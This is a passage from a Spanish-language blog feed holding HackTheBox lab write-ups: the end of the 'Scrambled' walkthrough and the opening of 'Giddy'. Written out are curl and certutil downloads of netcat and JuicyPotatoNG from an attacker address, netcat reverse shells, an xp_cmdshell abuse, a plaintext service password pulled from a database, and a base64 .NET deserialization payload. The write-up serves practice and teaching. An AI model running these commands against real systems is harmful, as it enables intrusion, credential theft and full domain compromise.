<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_SERVER_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_PRIVSVR_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora exportamos la variable.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno somos <code class="language-plaintext highlighter-rouge">administrator</code> a si que vamos habilitador <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y asi poder ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
</span>output
<span class="nt">-----------</span>
scrm<span class="se">\s</span>qlsvc

NULL

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a subir el nc.exe a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"curl 10.10.14.2/nc.exe -o C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span>
output                                                                  
<span class="nt">--------------------------------------------------------------------------------</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--100 28160  100 28160    0     0  85836      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 86116

NULL                                                                    
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe -e cmd 10.10.14.2 443"</span>
</code></pre></div></div>

<ul>
  <li>La recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 55826
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\s</span>qlsvc

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="shell-as-miscsvc">Shell as miscsvc</h2>

<ul>
  <li>Vemos otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\U</span>sers

05/11/2021  15:56    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  15:56    &lt;DIR&gt;          ..
05/11/2021  22:28    &lt;DIR&gt;          administrator
03/11/2021  20:31    &lt;DIR&gt;          miscsvc
26/01/2020  18:54    &lt;DIR&gt;          Public
01/06/2022  14:58    &lt;DIR&gt;          sqlsvc
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  16,013,860,864 bytes free
</code></pre></div></div>

<ul>
  <li>Vemos una vía no intencionada <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;whoami /priv
<span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacerlo por la vía intencionada si no ya seria explotar eso y listo.</p>
  </li>
  <li>
    <p>Vamos a enumerar el servicio <code class="language-plaintext highlighter-rouge">sql</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> SELECT name FROM master.sys.databases<span class="p">;</span>
name
<span class="nt">----------</span>
master

tempdb

model

msdb

ScrambleHR

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver las tablas de <code class="language-plaintext highlighter-rouge">ScrambleHR</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select </span>table_name from ScrambleHR.information_schema.tables<span class="p">;</span>
table_name
<span class="nt">----------</span>
Employees

UserImport

Timesheets

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select</span> <span class="k">*</span> from ScrambleHR.dbo.UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups
<span class="nt">--------</span>   <span class="nt">-----------------</span>   <span class="nt">----------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>
MiscSvc    ScrambledEggs9900   scrm.local                90               0
</code></pre></div></div>

<ul>
  <li>Podemos usar Powershell para definir la credencial.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
<span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
scrm<span class="se">\m</span>iscsvc
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> C:<span class="se">\T</span>emp<span class="se">\n</span>etcat.exe <span class="nt">-e</span> cmd 10.10.14.3 443 <span class="o">}</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61231
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\m</span>iscsvc

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
99e0ac7dcbc5c354ac0169f07630794d

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Vemos estos archivos interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client

05/11/2021  21:57    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  21:57    &lt;DIR&gt;          ..
05/11/2021  21:52            86,528 ScrambleClient.exe
05/11/2021  21:52            19,456 ScrambleLib.dll
               2 File<span class="o">(</span>s<span class="o">)</span>        105,984 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  16,009,113,600 bytes free

C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a descargarlo mediante <code class="language-plaintext highlighter-rouge">smbclient.py</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use IT</span>
<span class="c"># cd Apps\Sales Order Client</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 <span class="nb">.</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 ..
<span class="nt">-rw-rw-rw-</span>      86528  Fri Nov  5 14:57:08 2021 ScrambleClient.exe
<span class="nt">-rw-rw-rw-</span>      19456  Fri Nov  5 14:57:08 2021 ScrambleLib.dll
<span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleClient.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleLib.dll
</code></pre></div></div>

<ul>
  <li>Vamos a pasarlos a una maquina <code class="language-plaintext highlighter-rouge">Windows</code> para con <code class="language-plaintext highlighter-rouge">Dnspy</code> observar el código.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe.png" />
</p>

<ul>
  <li>Si le damos en edit. vemos que esta corriendo en el puerto 4411.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe2.png" />
</p>

<ul>
  <li>Al parecer parece un software de ordenes en la empresa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos analizar el código para ver que es lo que pasa por detrás.</p>
  </li>
  <li>
    <p>Y bueno ya vemos que emplea <code class="language-plaintext highlighter-rouge">Serialize</code> básicamente serializa la data y podemos modificar el input con un ataque de deserialización con base64.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial.png" />
</p>

<ul>
  <li>Como dato extra si observamos en la parte del login si el usuario es scrmdev podemos entrar y al parecer aplica un Bypass vamos a entrar con ese usuario sin proporcionar contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial2.png" />
</p>

<ul>
  <li>Lo que vamos hacer para ganar acceso es conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> y cuando eso pase enviar una data serializada pero necesitamos general un <code class="language-plaintext highlighter-rouge">payload</code> <a href="https://github.com/pwntester/ysoserial.net/releases">https://github.com/pwntester/ysoserial.net/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/yserial.png" />
</p>

<ul>
  <li>Vamos a crearlo en base64 en <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> con su gadget.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/xd.png" />
</p>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos y con <code class="language-plaintext highlighter-rouge">upload_order</code> como vimos en el código vamos a enviar nuestra data serializada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
UPLOAD_ORDER<span class="p">;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA9AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMXdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQmpiV1FnTVRBdU1UQXVNVFF1TXlBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs<span class="o">=</span>
ERROR_GENERAL<span class="p">;</span>Error deserializing sales order: Exception has been thrown by the target of an invocation.
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Y ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61761
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5b18e5184ded3c7a33e509daf9e06b2e

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Vamos a explotar una vía no intencionada <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
dir


    </span>Directory: C:<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>       01/05/2024     02:43         153600 JuicyPotato.exe        
<span class="nt">-a----</span>       30/04/2024     23:43          28160 netcat.exe             



PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha y nos enviamos la reverse Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; ./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
</code></pre></div></div>

<ul>
  <li>Ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61802
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\&gt;</span><span class="nb">hostname
hostname
</span>DC1

C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Giddy (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html" rel="alternate" type="text/html" title="HackTheBox - Giddy (medium)" /><published>2024-04-26T00:00:00-06:00</published><updated>2024-04-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/cd0f72b791b481e72b7099668409a6a8.png" />
</p>

<ul>
  <li>En este post vamos a resolver la maquina Giddy de la plataforma de Hack The Box donde aprovechándonos de una SQL Injection vamos a robar el hash NTLMv2 de un usuario y nos podremos conectarnos con evil-winrm ala maquina para la escalada de privilegios vamos abusar de un servicio que al correrlo podemos arrancar un .exe para hacer lo que queramos pero tendremos que hacer varios bypass al Windows Defender para conseguirlo.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y servicios por el protocolo <strong>TCP</strong> de la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,443,3389,5985 10.129.96.140 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-26 12:49 CST
Nmap scan report <span class="k">for </span>10.129.96.140
Host is up <span class="o">(</span>0.085s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|   h2
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: 2024-04-26T18:49:52+00:00<span class="p">;</span> <span class="nt">-7s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2024-04-26T18:49:46+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Giddy
| Not valid before: 2024-04-25T18:44:55
|_Not valid after:  2024-10-25T18:44:55
|_ssl-date: 2024-04-26T18:49:53+00:00<span class="p">;</span> <span class="nt">-6s</span> from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-6s</span>, deviation: 0s, median: <span class="nt">-6s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Nos estamos enfrentando a un <strong>Windows 10</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme rdp 10.129.96.140
RDP         10.129.96.140   3389   GIDDY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 or Windows Server 2016 Build 14393 <span class="o">(</span>name:GIDDY<span class="o">)</span> <span class="o">(</span>domain:Giddy<span class="o">)</span> <span class="o">(</span>nla:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estas son las tecnologías que corre por detrás la pagina web.</li>
</ul>

